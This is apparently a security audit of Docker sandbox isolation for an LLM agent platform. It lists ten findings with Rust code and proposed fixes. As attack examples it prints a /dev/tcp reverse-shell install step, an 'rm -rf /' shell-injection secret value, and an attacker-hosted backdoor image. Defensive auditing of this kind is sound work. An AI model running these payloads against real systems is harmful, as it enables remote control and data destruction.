# McClawd Docker Container Security Audit — 2026-03-06

## Executive Summary

Comprehensive audit of Docker container isolation for agent execution identified **10 security gaps** across 3 severity levels. **2 critical** vulnerabilities enable complete sandbox bypass; **3 high** allow data exfiltration or resource exhaustion; **5 medium** weaken isolation.

---

## Critical Findings

### 1. Host Execution Fallback (CRITICAL)
**Files:** `crates/mcclawd-api/src/server/tasks.rs:158-168`

LLM agent code runs directly on host when Docker unavailable:
```rust
if let Err(e) = run_agent_sandboxed(...).await {
    tracing::warn!("Docker unavailable — falling back to host execution (dev mode)");
    run_agent_host(state, task_id, prompt, workspace_name, tx).await;
}
```

**Trigger conditions:**
- Docker daemon crash
- Container network unreachable
- `/var/run/docker.sock` permission denied
- Orchestrator.connect() fails

**Impact:** Agent code executes with full host privileges, bypassing all container isolation.

**Fix:** Remove fallback; fail loudly:
```rust
let _ = run_agent_sandboxed(...).await?;  // Returns Err, terminates task
```

---

### 2. Dockerfile Shell Injection (CRITICAL)
**Files:** `crates/mcclawd-api/src/server/mcp_porter.rs:130-142`

Skill `install_steps` injected unsanitized into Dockerfile:
```rust
for step in install_steps {
    lines.push(format!("RUN {step}"));  // NO ESCAPING
}
```

**Attack scenario:**
1. Attacker registers skill with `install_steps: ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]`
2. Dockerfile generated: `RUN bash -i >& /dev/tcp/...`
3. Image built with reverse shell
4. ALL containers from image contain persistence payload

**Fix:** Shell-escape using `shlex`:
```rust
use shlex;
for step in install_steps {
    lines.push(format!("RUN {}", shlex::quote(step)));
}
```

---

## High Severity Findings

### 3. Secret Exposure via Environment Variables
**Files:** `crates/mcclawd-api/src/sandbox/container.rs:118-147`

Secrets passed in plaintext environment variables visible to:
- `docker inspect <container>` (Env field)
- `docker exec` subprocess listings
- `ps aux` inside container

```rust
let env_str = format!("SECRET_VALUE={value}");
let exec = docker.create_exec(..., env: Some(vec![env_str]), ...);
```

**Fix:** Use tmpfs mount only:
```rust
// Mount tmpfs at /run/secrets
let host_config = HostConfig {
    tmpfs: Some(HashMap::from([("/run/secrets".to_string(), "size=64m,noexec,nodev".to_string())])),
    ..
};
// Write secret to file inside tmpfs (ephemeral, auto-deleted on container stop)
```

---

### 4. Secret Shell Injection
**Files:** `crates/mcclawd-api/src/sandbox/container.rs:124`

Secrets wrapped in double quotes only; no escaping of `"`, `$`, backticks:

```rust
let cmd_str = format!("printf '%s' \"$SECRET_VALUE\" > /run/secrets/{key}");
```

**Attack:** Secret value `"; rm -rf /; #` becomes:
```bash
printf '%s' "; rm -rf /; #" > /run/secrets/ANTHROPIC_API_KEY
# Executes: rm -rf / (entire filesystem destroyed)
```

**Fix:** Use `execve()` directly without shell:
```rust
let exec = docker.create_exec(
    container_id,
    CreateExecOptions {
        cmd: Some(vec!["tee".to_string(), format!("/run/secrets/{}", key)]),
        ..Default::default()
    },
).await?;
// Pipe secret via stdin instead of env vars
```

---

### 5. No Resource Limits Enforced
**Files:** `crates/mcclawd-core/src/config.rs:226-246`

Container resource limits default to `None` (unlimited):
```rust
pub struct SandboxConfig {
    #[serde(default = "default_sandbox_memory")]
    pub memory_limit: Option<i64>,  // None = unlimited
    pub cpu_limit: Option<i64>,     // None = unlimited
}
```

No disk quotas, process limits, or network quotas.

**Attack:** Malicious agent loop `while true: malloc(1GB)` exhausts host memory → OOM kills other containers.

**Fix:** Set defaults in `SandboxConfig::default()`:
```rust
impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            memory_limit: Some(512 * 1024 * 1024),  // 512MB
            cpu_limit: Some(512),                    // 512 shares
            pids_limit: Some(256),                   // Max 256 processes
        }
    }
}
```

---

### 6. Container Cleanup Race Condition
**Files:** `crates/mcclawd-api/src/sandbox/container.rs:218-262`

No guarantee container is removed on error:
```rust
match self.stream_logs_and_wait(&handle.container_id).await {
    Ok(_) => {},
    Err(e) => {
        tracing::warn!(error = %e, "Log streaming ended with error");
        // Falls through to cleanup
    }
}
if let Err(e) = self.cleanup_container(&handle.container_id).await {
    tracing::warn!("Failed to cleanup sandbox container");
    // Error logged but IGNORED — container may remain running
}
```

If orchestrator crashes, orphaned containers persist.

**Fix:** Use `scopeguard` for guaranteed cleanup:
```rust
use scopeguard::guard;
let cleanup_guard = guard(handle.container_id.clone(), |cid| {
    // Cleanup always runs on scope exit
    let _ = tokio::runtime::Handle::current().block_on(self.cleanup_container(&cid));
});
// ... streaming and waiting ...
drop(cleanup_guard);  // Explicit or automatic on fn return
```

---

## Medium Severity Findings

### 7. Network Isolation Not Verified
**Files:** `crates/mcclawd-api/src/sandbox/container.rs:85`

No verification that network is isolated:
```rust
network_mode: Some(sandbox_config.network.clone()),  // "mcclawd_tools"
```

Container can:
- Reach host gateway (172.17.0.1 on default docker0)
- Resolve external DNS
- Establish outbound connections

**Fix:** Create isolated network bridge:
```bash
docker network create mcclawd_tools --internal  # --internal blocks external traffic
```

---

### 8. MCP Fallback to Host
**Files:** `crates/mcclawd-agent/src/engine.rs:66-69` + `mcp_integration.rs:25-29`

Container MCP connection falls back to host if env var unset:
```rust
match connect_from_env().await? {
    Some(mcp) => Ok(mcp),
    None => {
        // Falls back to host-based connection
        crate::mcp_integration::connect_mcp_tools(config).await?
    }
}
```

If container startup skips MCCLAWD_GATEWAY_URL injection, MCP tools accessed from host.

**Fix:** Fail loudly if container:
```rust
pub async fn connect_from_env() -> Result<Vec<McpBundle>> {
    let url = env::var("MCCLAWD_GATEWAY_URL")
        .context("MCCLAWD_GATEWAY_URL required in container")?;  // Panics if missing
    // ...
}
```

---

### 9. Workspace Mount Writable
**Files:** `crates/mcclawd-api/src/sandbox/container.rs:73-76`

Workspace mounted read-write; container can persist changes:
```rust
if !secrets.is_empty() {
    HostConfig::binds: Some(vec![...])  // /workspace likely :rw
}
```

Agent modifies workspace files → changes persist on host across restarts.

**Fix:** Mount read-only with tmpfs overlay:
```rust
// /workspace:ro read-only
// /tmp tmpfs for agent to write to
```

---

### 10. No Image Signature Verification
**Files:** `crates/mcclawd-api/src/server/mcp_porter.rs:107`

Base images pulled without digest pinning or signature verification. Malicious skill specifies `base_image: "attacker.com/backdoor:latest"`.

**Fix:** Allow only digests:
```rust
if !base_image.contains("@sha256:") {
    bail!("Base image must be pinned by digest (e.g., image@sha256:abcd...)");
}
```

---

## Remediation Roadmap

| Severity | Issue | Effort | Priority |
|----------|-------|--------|----------|
| CRITICAL | Host fallback | 2h | P0 |
| CRITICAL | Dockerfile injection | 1h | P0 |
| HIGH | Secret env vars → tmpfs | 4h | P1 |
| HIGH | Secret shell injection fix | 2h | P1 |
| HIGH | Resource limits defaults | 1h | P1 |
| HIGH | Cleanup guarantee (scopeguard) | 3h | P1 |
| MEDIUM | Network isolation | 1h | P2 |
| MEDIUM | MCP fallback fail | 1h | P2 |
| MEDIUM | Workspace read-only | 2h | P2 |
| MEDIUM | Image digest pinning | 1h | P2 |

**Total:** ~18 hours for full remediation across all severities.

---

## Files Audited
- `crates/mcclawd-api/src/server/tasks.rs` — host fallback, container orchestration
- `crates/mcclawd-api/src/sandbox/container.rs` — container creation, secrets, cleanup
- `crates/mcclawd-api/src/server/mcp_porter.rs` — Dockerfile generation
- `crates/mcclawd-agent/src/engine.rs` — MCP connection fallback
- `crates/mcclawd-agent/src/mcp_integration.rs` — MCP container detection
- `crates/mcclawd-core/src/config.rs` — SandboxConfig resource limits
